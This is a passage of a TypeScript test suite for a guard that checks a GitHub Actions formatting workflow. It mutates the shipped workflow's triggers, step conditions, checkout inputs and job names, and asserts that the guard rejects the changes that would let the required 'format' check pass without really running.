      "steps.format_check.outcome == 'success'",
      'AC1',
    ],
    [
      "== 'skipped' — fires only when the check never ran, i.e. on the broken `pnpm install`",
      "steps.format_check.outcome == 'skipped'",
      'wrong diagnosis',
    ],
    [
      "== 'cancelled' — fires on a superseded run and on nothing else",
      "steps.format_check.outcome == 'cancelled'",
      'AC1',
    ],
    ["!= 'failure' — the scope inverted", "steps.format_check.outcome != 'failure'", 'AC1'],
    [
      "!= 'success' — true for `failure`, `skipped` AND `cancelled`, i.e. the unscoped remedy back",
      "steps.format_check.outcome != 'success'",
      'wrong diagnosis',
    ],
    [
      "conclusion == 'success' — the same inversion on the other status field",
      "steps.format_check.conclusion == 'success'",
      'AC1',
    ],
    [
      'a bare reference with no comparison, which is truthy for all four values',
      'steps.format_check.outcome',
      'no comparison',
    ],
    [
      '`contains()` instead of the equality this allow-list accepts',
      "contains(steps.format_check.outcome, 'failure')",
      'not canonical',
    ],
  ]

  for (const [label, condition] of rejected) {
    it(`fails on ${label}`, () => {
      const r = checkFormatWorkflow(
        mutate(
          WELL_FORMED,
          `failure() && ${SCOPE}`,
          `failure() && ${condition}`,
          'the scoped remedy condition',
        ),
      )
      expect(r.ok, `${condition}: ${r.message}`).toBe(false)
      expect(r.message, condition).toContain("== 'failure'")
    })
  }

  // The reference is still there, so the "not scoped at all" message would be the wrong
  // cause to report: the author DID scope it, to the wrong value.
  it('names the comparison, not the missing reference, when the value is wrong', () => {
    const r = checkFormatWorkflow(
      mutate(
        WELL_FORMED,
        `failure() && ${SCOPE}`,
        "failure() && steps.format_check.outcome == 'success'",
        'the scoped remedy condition',
      ),
    )
    expect(r.message).toContain('compare it to')
    expect(r.message).not.toContain('are not scoped to the formatting check')
  })
})

// Requiring the equality to be PRESENT is the third leg; requiring it to DECIDE is the
// fourth. `if:` is a boolean expression, and in GitHub's grammar `&&` binds tighter than
// `||`, so `failure() && <scope> || <anything>` parses as `(failure() && <scope>) || <anything>`
// — the scope is still there, spelled exactly as shipped, and decides nothing.
describe('a failure-path scope must DECIDE, not merely appear (#413)', () => {
  const SCOPE = "steps.format_check.outcome == 'failure'"
  const remedyOf = (condition: string) =>
    mutate(WELL_FORMED, `failure() && ${SCOPE}`, condition, 'the scoped remedy condition')

  // Every one of these keeps `steps.format_check.outcome == 'failure'` intact, so
  // `scopesTo` reports them scoped — and every one of them fires the remedy on a run the
  // check did not fail on, which is round 3's loss (a broken `pnpm install` annotated
  // "not formatted. Run `pnpm format`") restored by adding tokens the guard never reads.
  const neutralized: [string, string][] = [
    [
      '`|| true`, which makes the whole condition unconditionally true',
      `failure() && ${SCOPE} || true`,
    ],
    [
      '`|| github.event_name ==` …, true on every push regardless of the check',
      `failure() && ${SCOPE} || github.event_name == 'push'`,
    ],
    [
      "another step's outcome ORed in — the install failure this scope exists to stay quiet about",
      `failure() && ${SCOPE} || steps.install.outcome == 'failure'`,
    ],
    [
      'the same disjunction parenthesised, so the scope is one disjunct of two',
      `failure() && (${SCOPE} || steps.install.outcome == 'failure')`,
    ],
    ['`always()` ORed in front of the whole guard', `always() || failure() && ${SCOPE}`],
    ['the scope negated as a group', `failure() && !(${SCOPE})`],
    [
      "the status reference negated, which compares `false` to `'failure'` and is never true",
      `failure() && !steps.format_check.outcome == 'failure'`,
    ],
    ['the neutralised condition wrapped in an expression', `\${{ failure() && ${SCOPE} || true }}`],
  ]

  for (const [label, condition] of neutralized) {
    it(`fails on ${label}`, () => {
      const r = checkFormatWorkflow(remedyOf(condition))
      expect(r.ok, `${condition}: ${r.message}`).toBe(false)
      expect(r.message, condition).toContain('decides nothing')
    })
  }

  // "A conjunction can only narrow" was the round-8 premise, and narrowing to ZERO on
  // the PR path IS the AC1 loss: `&& github.event_name == 'push'` keeps the scope exactly
  // right and skips the remedy on every `pull_request` run — the contributor this
  // workflow exists for reads `--list-different`'s bare filename with no instruction,
  // the identical loss `== 'success'` costs, reached through the conjunct form the guard
  // explicitly waved through. So the conjunction is an ALLOW-list too: every `&&` term
  // must be `failure()`, a negated status function that is TRUE on the failure path
  // (`!cancelled()`, `!success()`), or the scope equality. Anything else — a `github.*`
  // context, another step's outcome, a literal, `always()` (a no-op), `!failure()`
  // (never true beside `failure()`), a SECOND equality on the same context — is rejected.
  const narrowedToZero: [string, string][] = [
    [
      "`&& github.event_name == 'push'`, false on every pull_request run",
      `failure() && ${SCOPE} && github.event_name == 'push'`,
    ],
    ['`&& false`, never true', `failure() && ${SCOPE} && false`],
    [
      "`&& steps.install.outcome == 'success'`, another step's outcome ANDed in",
      `failure() && ${SCOPE} && steps.install.outcome == 'success'`,
    ],
    ['`&& !failure()`, false whenever `failure()` is true', `failure() && ${SCOPE} && !failure()`],
    ['`&& always()`, a conjunct that decides nothing', `failure() && ${SCOPE} && always()`],
    [
      "a second equality on the same context (`== 'success'`), so the conjunction is never true",
      `failure() && ${SCOPE} && steps.format_check.outcome == 'success'`,
    ],
    [
      "the round-8 'narrowing' conjunct itself (`&& github.event_name == 'pull_request'`)",
      `failure() && ${SCOPE} && github.event_name == 'pull_request'`,
    ],
  ]

  for (const [label, condition] of narrowedToZero) {
    it(`fails on ${label}`, () => {
      const r = checkFormatWorkflow(remedyOf(condition))
      expect(r.ok, `${condition}: ${r.message}`).toBe(false)
      expect(r.message, condition).toContain('decides nothing')
    })
  }

  // The allow-listed conjuncts, in the spellings a correct workflow may use — a `!` on a
  // status FUNCTION that is true on the failure path is not a `!` on the scope, an outer
  // `${{ }}` is how GitHub lets any `if:` be written, and a parenthesised term is the same
  // term. Rejecting these would fail a correct workflow, which is how a guard gets weakened.
  const kept: [string, string][] = [
    [
      '`!cancelled()`, a negated function rather than a negated scope',
      `failure() && !cancelled() && ${SCOPE}`,
    ],
    ['`!success()`, true on the failure path', `failure() && !success() && ${SCOPE}`],
    ['the shipped spelling itself', `failure() && ${SCOPE}`],
    ['the shipped spelling wrapped in `${{ }}`', `\${{ failure() && ${SCOPE} }}`],
    ['each term parenthesised', `(failure()) && (${SCOPE})`],
    ['the equality reversed', `failure() && 'failure' == steps.format_check.outcome`],
  ]

  for (const [label, condition] of kept) {
    it(`accepts ${label}`, () => {
      const r = checkFormatWorkflow(remedyOf(condition))
      expect(r.ok, `${condition}: ${r.message}`).toBe(true)
    })
  }

  // The three buckets stay disjoint: a neutralised condition DOES name the check and
  // DOES carry the equality, so reporting it as "not scoped" or "does not compare it to
  // 'failure'" would name a cause the author already got right.
  it('names the neutralisation, not the missing reference or the wrong value', () => {
    const r = checkFormatWorkflow(remedyOf(`failure() && ${SCOPE} || true`))
    expect(r.message).toContain('decides nothing')
    expect(r.message).not.toContain('are not scoped to the formatting check')
    expect(r.message).not.toContain('do not compare it to')
  })

  // On the file this repo actually runs, not only the fixture: the mutation is one
  // ` || true` appended to line 139, and every other rule in the module stays green.
  it('fires on the shipped workflow when the scope is ORed away', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(
      mutate(shipped, `failure() && ${SCOPE}`, `failure() && ${SCOPE} || true`, SCOPE),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('decides nothing')
  })

  // The same on the conjunct form. Measured on GitHub (probe run on this PR, see the
  // working log): with `&& github.event_name == 'push'` appended, a PR carrying an
  // unformatted file gets `Check formatting: failure` and the remedy step `skipped`.
  it('fires on the shipped workflow when a conjunct narrows the remedy off the PR path', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(
      mutate(
        shipped,
        `failure() && ${SCOPE}`,
        `failure() && ${SCOPE} && github.event_name == 'push'`,
        SCOPE,
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('decides nothing')
  })
})

// The guard reads the REAL file, exactly like `checkThisRepoGate` does — a
// hand-maintained fixture would keep passing while the shipped workflow drifts.
describe('checkThisRepoFormatWorkflow reads the shipped workflow (#413)', () => {
  it('points at .github/workflows/format.yml', () => {
    expect(FORMAT_WORKFLOW.endsWith('.github/workflows/format.yml')).toBe(true)
  })

  it('the workflow exists on disk', () => {
    expect(existsSync(FORMAT_WORKFLOW), `${FORMAT_WORKFLOW} is missing`).toBe(true)
  })

  it('this repo’s format workflow satisfies every rule above', () => {
    const r = checkThisRepoFormatWorkflow()
    expect(r.ok, r.message).toBe(true)
  })

  it('reports a missing workflow as a failure, never a vacuous pass', () => {
    // The degenerate case the story is about: no workflow at all must be RED.
    expect(checkFormatWorkflow('').ok).toBe(false)
  })

  // Asserted against the SHIPPED file, not the fixture: the guard is only worth
  // anything if it fires on the workflow this repo actually runs. (The rule is
  // "declares no paths-ignore", not "never says the word" — the header comment
  // explains why the key is banned, and a comment must not fail the check.)
  it('fires on the shipped workflow the moment a paths-ignore is declared in it', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(
      shipped.replace(
        '  push:\n    branches:',
        '  push:\n    paths-ignore:\n      - .changeset/**\n    branches:',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('paths-ignore')
  })

  // The same "fires on the SHIPPED file" treatment for the three properties whose
  // absence a well-formed fixture cannot demonstrate: they are job-level, and a
  // fixture that drifts from the real job would keep passing while the real job
  // goes advisory / privileged / silent.
  it('fires on the shipped workflow when the job is made advisory or privileged', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const advisory = checkFormatWorkflow(
      shipped.replace(
        '      - name: Check formatting\n',
        '      - name: Check formatting\n        continue-on-error: true\n',
      ),
    )
    expect(advisory.ok).toBe(false)
    expect(advisory.message).toContain('continue-on-error')

    const privileged = checkFormatWorkflow(shipped.replace('contents: read', 'contents: write'))
    expect(privileged.ok).toBe(false)
    expect(privileged.message).toContain('permissions')
  })

  it('fires on the shipped workflow when its failure path stops naming the remedy', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(shipped.replace(/^\s*if: failure\(\).*\n/m, ''))
    expect(r.ok).toBe(false)
    expect(r.message).toContain('pnpm format')
  })

  it('fires on the shipped workflow when the remedy widens to a bare `if: failure()`', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(shipped.replace(/^(\s*)if: failure\(\).*$/m, '$1if: failure()'))
    expect(r.ok).toBe(false)
    expect(r.message).toContain('not scoped')
  })

  // The two never-true `if:` EXPRESSIONS, on the file this repo actually runs: the
  // job-level one skips the job, the step-level one leaves the job green with the
  // only checking step skipped. A literal-false deny-list waved both through.
  it('fires on the shipped workflow when a never-true `if:` is added to the job', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(
      shipped.replace(
        '  format:\n    runs-on:',
        "  format:\n    if: github.event_name == 'workflow_dispatch'\n    runs-on:",
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('if:')
  })

  it('fires on the shipped workflow when a never-true `if:` is added to the check step', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(
      shipped.replace(
        '      - name: Check formatting\n',
        "      - name: Check formatting\n        if: github.event_name == 'push'\n",
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('if:')
  })

  // The three spellings an allow-list keyed on `failure()` alone waved through, on
  // the file this repo actually runs. All of them leave `Check formatting` skipped
  // on a normal pull request while the job — and the `format` context — end green.
  it('fires on the shipped workflow when the check step is given a `failure()` guard', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const conditions = [
      'failure()',
      "github.event_name == 'push' && failure()",
      "failure() && steps.format_check.outcome == 'failure'",
    ]
    for (const condition of conditions) {
      const r = checkFormatWorkflow(
        shipped.replace(
          '      - name: Check formatting\n',
          `      - name: Check formatting\n        if: ${condition}\n`,
        ),
      )
      expect(r.ok, `${condition}: ${r.message}`).toBe(false)
      expect(r.message).toContain('if:')
    }
  })

  // One correctly-scoped remedy must not license a second, job-scoped one: the
  // annotation would fire on a broken `pnpm install` and tell the contributor to
  // run `pnpm format` against a cause it cannot fix.
  it('fires on the shipped workflow when a second unscoped `failure()` step is added', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(
      `${shipped}      - name: Extra note
        if: failure()
        run: echo "::error title=Formatting check failed::not formatted"
`,
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('not scoped')
  })

  it('fires on the shipped workflow when `if: failure()` is added to the install step', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(
      shipped.replace(
        '      - name: Install dependencies\n',
        '      - name: Install dependencies\n        if: failure()\n',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('not scoped')
  })

  // Quoting the id is valid YAML and resolves identically on GitHub: the shipped
  // workflow must stay GREEN through it, or the guard fails a correct file.
  it('stays green on the shipped workflow when its `id:` is quoted', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(
      mutate(shipped, 'id: format_check', "id: 'format_check'", '`id: format_check`'),
    )
    expect(r.ok, r.message).toBe(true)
  })

  // One token on the file this repo actually runs. `failure()` is still true when the
  // formatting check fails, but `outcome` is `'failure'`, so `== 'success'` is FALSE and
  // the remedy step is skipped on precisely the run that needed it: the contributor gets
  // `--list-different`'s bare filename with prettier's own "--write to fix" hint
  // suppressed, and nothing telling them what to run (AC1).
  it('fires on the shipped workflow when the remedy scope compares against the wrong outcome', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    for (const value of ['success', 'skipped']) {
      const r = checkFormatWorkflow(
        mutate(
          shipped,
          "steps.format_check.outcome == 'failure'",
          `steps.format_check.outcome == '${value}'`,
          "the shipped remedy's scope",
        ),
      )
      expect(r.ok, `${value}: ${r.message}`).toBe(false)
      expect(r.message, value).toContain('compare it to')
    }
  })

  // The reviewer's measured repro: a second job the `format` job depends on. `precheck`
  // fails (or is itself skipped), `format` never runs and is reported skipped, and a
  // skipped job reports its required check SUCCESSFUL — so once AC8 lists `format` the
  // merge goes through with the formatting check never having executed.
  it('fires on the shipped workflow when the format job is gated by `needs:`', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const gated = mutate(
      shipped,
      '  format:\n    runs-on: ubuntu-latest\n',
      `  precheck:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - name: Gate
        run: exit 1
  format:
    needs: precheck
    runs-on: ubuntu-latest
`,
      'the shipped `format` job header',
    )
    const r = checkFormatWorkflow(gated)
    expect(r.ok, r.message).toBe(false)
    expect(r.message).toContain('needs:')
  })

  // The negative branch filter, on the shipped file: one line under `pull_request`
  // and no PR targeting `main` is ever format-checked.
  it('fires on the shipped workflow when a trigger gains a `branches-ignore`', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    for (const event of ['pull_request', 'push']) {
      const r = checkFormatWorkflow(
        shipped.replace(
          `  ${event}:\n    branches:\n      - main`,
          `  ${event}:\n    branches-ignore:\n      - main`,
        ),
      )
      expect(r.ok, `${event}: ${r.message}`).toBe(false)
      expect(r.message).toContain('branches-ignore')
    }
  })

  // The flow-mapping hole, on the file this repo actually runs. Each of the four is
  // ONE line of valid YAML that GitHub honours, and each left `ok=true` before round 5:
  // a markdown-only PR never format-checked, no PR targeting `main` ever checked, the
  // check running only after the PR closes, and post-merge drift on `main` invisible.
  // Since the parser migration the SPELLING is read and the SEMANTIC rule is what fires,
  // so each row asserts its own cause — and the correct flow spelling stays green.
  it('fires on the shipped workflow when a trigger is respelled as a flow mapping WITH a hole', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const holes: [string, string, string][] = [
      [
        '  pull_request:\n    branches:\n      - main\n',
        "  pull_request: { branches: [main], paths-ignore: ['**/*.md'] }\n",
        'paths-ignore',
      ],
      [
        '  pull_request:\n    branches:\n      - main\n',
        '  pull_request: { branches: [release] }\n',
        'does not cover `main` (release)',
      ],
      [
        '  pull_request:\n    branches:\n      - main\n',
        '  pull_request: { branches: [main], types: [closed] }\n',
        'dropping opened, synchronize',
      ],
      [
        '  push:\n    branches:\n      - main\n',
        '  push: { branches: [release] }\n',
        'does not cover `main` (release)',
      ],
    ]
    for (const [block, flow, cause] of holes) {
      const mutated = shipped.replace(block, flow)
      expect(mutated, `${flow}: the shipped file no longer contains the block spelling`).not.toBe(
        shipped,
      )
      const r = checkFormatWorkflow(mutated)
      expect(r.ok, `${flow}: ${r.message}`).toBe(false)
      expect(r.message, flow).toContain(cause)
    }
  })

  it('stays green on the shipped workflow when a correct trigger is respelled as a flow mapping', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(
      mutate(
        shipped,
        '  pull_request:\n    branches:\n      - main\n',
        '  pull_request: { branches: [main] }\n',
        'the shipped `pull_request` trigger',
      ),
    )
    expect(r.ok, r.message).toBe(true)
  })

  // The `uses:` writer, on the shipped file. Before the `Check formatting` step this
  // needs no permission at all: the action rewrites the runner's checkout, the check
  // then passes on unformatted code, and the `format` context goes green.
  it('fires on the shipped workflow when a formatting action is added', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(
      shipped.replace(
        '      - name: Check formatting\n',
        '      - name: Fix\n        uses: creyD/prettier_action@v4\n        with:\n          prettier_options: --write .\n      - name: Check formatting\n',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('uses:')
  })

  it('fires on the shipped workflow when a writer hides behind a quoted `#`', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(
      shipped.replace(
        '      - name: Install dependencies\n        run: pnpm install\n',
        '      - name: Install dependencies\n        run: |\n          pnpm install\n          echo "note # here"; prettier --write .\n',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('prettier --write')
  })

  it('fires on the shipped workflow when the job that carries the context is renamed', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(shipped.replace('\n  format:\n', '\n  fmt:\n'))
    expect(r.ok).toBe(false)
    expect(r.message).toContain('status context')
  })

  // Measured on the shipped file before the fix: `ok=true`. `format` reports SUCCESS
  // after an `echo`; the job that checks publishes `worker`, which nothing requires.
  it('fires on the shipped workflow when a decoy job takes the `format` name', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(
      shipped.replace(
        '\n  format:\n',
        `
  format:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - name: Nothing
        run: echo ok
  worker:
`,
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('is `worker`, not `format`')
  })

  // Each of these was measured `ok=true` on the shipped file before round 6: a step
  // spelled as anything but a block mapping was invisible to `usesProblems` AND to the
  // write-mode scan, so inserted before the checking step it rewrites the checkout and
  // the `format` context goes green on unformatted code (AC6). The parser resolves each
  // to the same mapping GitHub runs (probe run 33724282504 on PR #477: the JSON-spelled
  // step executed), so every step rule now reads it — and names the real cause.
  it('fires on the shipped workflow when a step is spelled as a flow item', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const items: [string, string][] = [
      ['- { name: Fix, run: npx prettier --write . }', 'prettier --write'],
      ['- {run: prettier --write .}', 'prettier --write'],
      ['- { uses: creyD/prettier_action@v4 }', 'uses:'],
      ['- { uses: stefanzweifel/git-auto-commit-action@v5 }', 'uses:'],
      ['- { "name": "Fix", "run": "npx prettier --write ." }', 'prettier --write'],
    ]
    for (const [item, cause] of items) {
      const r = checkFormatWorkflow(
        shipped.replace(
          '      - name: Check formatting\n',
          `      ${item}\n      - name: Check formatting\n`,
        ),
      )
      expect(r.ok, `${item}: ${r.message}`).toBe(false)
      expect(r.message, item).toContain(cause)
    }
  })

  // …and a correct step spelled as a flow item stays green on the shipped file — the
  // spelling GitHub accepted in the same probe run.
  it('stays green on the shipped workflow when a correct step is spelled as a flow item', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(
      mutate(
        shipped,
        '      - name: Check formatting\n',
        '      - { name: Install dependencies, run: pnpm install }\n      - name: Check formatting\n',
        'the shipped checking step',
      ),
    )
    expect(r.ok, r.message).toBe(true)
  })

  // The shipped file's own `run: |` block scalar contains shell (`if ! command -v
  // pnpm …`), and the workflow is green: the structural rules do not read that body.
  it('stays green on the shipped workflow, whose run blocks carry real shell', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    expect(shipped, 'the shipped workflow no longer has a block scalar to prove this on').toContain(
      'run: |',
    )
    expect(checkFormatWorkflow(shipped).ok).toBe(true)
  })

  it('fires on the shipped workflow when the remedy is moved above the checking step', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const remedy =
      / {6}- name: Explain how to fix a formatting failure\n(?:.*\n)*? {10}echo "::error[^\n]*\n/
    const found = remedy.exec(shipped)
    expect(found, 'the shipped remedy step was not found').not.toBeNull()
    const moved = shipped
      .replace(remedy, '')
      .replace(
        '      - name: Check formatting\n',
        `${found?.[0] ?? ''}      - name: Check formatting\n`,
      )
    const r = checkFormatWorkflow(moved)
    expect(r.ok).toBe(false)
    expect(r.message).toContain('has not run yet')
  })

  it('fires on the shipped workflow when the checking command is narrowed', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(
      shipped.replace('run: pnpm format:check', 'run: pnpm --filter=@pair/website format:check'),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('one command, two places')
  })

  it('fires on the shipped workflow when cancel-in-progress negates the PR event', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(
      shipped.replace(
        "cancel-in-progress: ${{ github.event_name == 'pull_request' }}",
        "cancel-in-progress: ${{ github.event_name != 'pull_request' }}",
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('cancel-in-progress')
  })

  // Measured `ok=true` on the shipped file before the fix. The workflow never runs on
  // a push to any branch — post-merge drift invisible with the guard green.
  it('fires on the shipped workflow when `push:` is filtered by tags alone', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(
      shipped.replace(
        '  push:\n    branches:\n      - main\n',
        "  push:\n    tags:\n      - 'v*'\n",
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('tags')
  })

  it('stays green on the shipped workflow when a tags filter is added BESIDE the branch filter', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(
      mutate(
        shipped,
        '  push:\n    branches:\n      - main\n',
        "  push:\n    branches:\n      - main\n    tags:\n      - 'v*'\n",
        'the shipped `push:` trigger',
      ),
    )
    expect(r.ok, r.message).toBe(true)
  })

  // Measured `ok=true` on the shipped file before the fix, both spellings. Every run in
  // one group: a PR push cancels main's in-progress run.
  it('fires on the shipped workflow when the concurrency group stops being keyed on the ref', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    for (const group of ['group: format', 'group: ${{ github.workflow }}']) {
      const r = checkFormatWorkflow(shipped.replace('group: format-${{ github.ref }}', group))
      expect(r.ok, group).toBe(false)
      expect(r.message, group).toContain('github.ref')
    }
  })

  // Measured `ok=true` on the shipped file before the fix, both rows: a `name:` renames
  // the published context, a matrix suffixes it — `format` stops existing either way.
  it('fires on the shipped workflow when the host job is given a display name', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(
      shipped.replace(
        '  format:\n    runs-on: ubuntu-latest\n',
        '  format:\n    name: Formatting\n    runs-on: ubuntu-latest\n',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('display name')
  })

  it('fires on the shipped workflow when the host job is given a matrix', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(
      shipped.replace(
        '  format:\n    runs-on: ubuntu-latest\n',
        "  format:\n    strategy:\n      matrix:\n        node: ['20']\n    runs-on: ubuntu-latest\n",
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('strategy')
  })
})

// `uses:` was matched on the action NAME only, so the step's `with:` was invisible.
// Producer boundary (actions/checkout@v4 action.yml, input `ref`): "The branch, tag or
// SHA to checkout. When checking out the repository that triggered a workflow, this
// defaults to the reference or SHA for that event" — i.e. setting it REPLACES the PR
// merge ref. Measured on GitHub (probe run on this PR, see the working log): with
// `with: ref: main` on the shipped checkout, a PR carrying an unformatted file gets a
// SUCCESSFUL `format` context — CI checked `main`, not the PR. `sparse-checkout` is
// AC4's subset divergence spelled as a checkout input; `repository` and `path` change
// what tree the command runs on at all. So the checkout's `with:` is an ALLOW-list of
// fetch-mechanics inputs that leave the tree as the event's ref.
describe('the checkout step may not choose WHAT is checked out (#413)', () => {
  const CHECKOUT = '      - name: Checkout code\n        uses: actions/checkout@v4\n'
  const withInputs = (source: string, inputs: string) =>
    mutate(source, CHECKOUT, `${CHECKOUT}        with:\n${inputs}`, 'the checkout step')

  const redirected: [string, string, string][] = [
    ['`ref: main`, the base branch instead of the PR merge ref', '          ref: main\n', 'ref'],
    [
      '`ref:` set to an expression',
      '          ref: ${{ github.event.pull_request.base.sha }}\n',
      'ref',
    ],
    ['`repository:`, another repository', '          repository: foomakers/other\n', 'repository'],
    ['`path:`, a directory the check does not run in', '          path: checkout\n', 'path'],
    [
      '`sparse-checkout:`, a subset of the tree',
      '          sparse-checkout: packages/dev-tools\n',
      'sparse-checkout',
    ],
    [
      '`sparse-checkout-cone-mode:`',
      '          sparse-checkout-cone-mode: false\n',
      'sparse-checkout-cone-mode',
    ],
    ['`submodules:`, content the PR does not carry', '          submodules: true\n', 'submodules'],
    ['`lfs:`', '          lfs: true\n', 'lfs'],
    [
      '`token:`, not an allow-listed input either',
      '          token: ${{ github.token }}\n',
      'token',
    ],
    [
      'a rejected input BESIDE an accepted one',
      '          fetch-depth: 0\n          ref: main\n',
      'ref',
    ],
    ["a quoted key (`'ref'`)", "          'ref': main\n", 'ref'],
    ['an input this guard has never heard of', '          new-input: true\n', 'new-input'],
  ]

  for (const [label, inputs, key] of redirected) {
    it(`fails on checkout ${label}`, () => {
      const r = checkFormatWorkflow(withInputs(WELL_FORMED, inputs))
      expect(r.ok, `${inputs}: ${r.message}`).toBe(false)
      expect(r.message, inputs).toContain('with:')
      expect(r.message, inputs).toContain(`\`${key}\``)
    })
  }

  // The recommendation's named inputs are named in the message, whichever one fired —
  // the reader learns the whole class, not the one key they happened to write.
  it('names `ref`, `repository`, `path`, `sparse-checkout` and `sparse-checkout-cone-mode` in the message', () => {
    const r = checkFormatWorkflow(withInputs(WELL_FORMED, '          submodules: true\n'))
    expect(r.ok).toBe(false)
    for (const key of [
      'ref',
      'repository',
      'path',
      'sparse-checkout',
      'sparse-checkout-cone-mode',
    ]) {
      expect(r.message).toContain(`\`${key}\``)
    }
  })

  // The `with:` is READ whatever its spelling — the parser resolves a flow mapping and
  // an alias to the same inputs GitHub passes the action, so the allow-list decides.
  it('fails on a flow-style `with: { ref: main }`, naming the input', () => {
    const r = checkFormatWorkflow(
      mutate(
        WELL_FORMED,
        CHECKOUT,
        `${CHECKOUT}        with: { ref: main }\n`,
        'the checkout step',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('with:')
    expect(r.message).toContain('`ref`')
  })

  it('follows `with: *inputs` to the inputs the alias names', () => {
    const r = checkFormatWorkflow(
      mutate(
        WELL_FORMED,
        CHECKOUT,
        `      - name: Anchor\n        uses: actions/setup-node@v4\n        with: &inputs\n          ref: main\n${CHECKOUT}        with: *inputs\n`,
        'the checkout step',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('with:')
    expect(r.message).toContain('`ref`')
  })

  it('stays green on an aliased `with:` carrying only fetch mechanics', () => {
    const r = checkFormatWorkflow(
      mutate(
        WELL_FORMED,
        CHECKOUT,
        `${CHECKOUT}        with: &inputs\n          fetch-depth: 0\n`,
        'the checkout step',
      ),
    )
    expect(r.ok, r.message).toBe(true)
  })

  // Fetch mechanics leave the tree as the event's ref — a guard that rejected `fetch-depth: 0`
  // would fail a correct workflow, which is how a guard gets weakened.
  const mechanics: [string, string][] = [
    ['`fetch-depth: 0`', '          fetch-depth: 0\n'],
    [
      '`fetch-depth` and `persist-credentials: false`',
      '          fetch-depth: 0\n          persist-credentials: false\n',
    ],
    ['`fetch-tags: false`', '          fetch-tags: false\n'],
    ['`show-progress: false`', '          show-progress: false\n'],
    ['`clean: true`', '          clean: true\n'],
    ['`set-safe-directory: true`', '          set-safe-directory: true\n'],
    ["a quoted accepted key (`'fetch-depth'`)", "          'fetch-depth': 1\n"],
  ]

  for (const [label, inputs] of mechanics) {
    it(`accepts checkout with ${label}`, () => {
      const r = checkFormatWorkflow(withInputs(WELL_FORMED, inputs))
      expect(r.ok, `${inputs}: ${r.message}`).toBe(true)
    })
  }

  it('accepts the bare `uses: actions/checkout@v4` (the shipped spelling)', () => {
    const r = checkFormatWorkflow(WELL_FORMED)
    expect(WELL_FORMED).toContain(CHECKOUT)
    expect(r.ok, r.message).toBe(true)
  })

  // The bound: only the checkout decides WHAT is checked out. `pnpm/action-setup` and
  // `actions/setup-node` inputs choose tool versions, never the tree, so their `with:` is
  // not constrained — the fixture already carries `version:`, `node-version:`, `cache:`.
  it('does not constrain the `with:` of the toolchain actions', () => {
    const r = checkFormatWorkflow(
      mutate(
        WELL_FORMED,
        "          version: '10.15.0'\n",
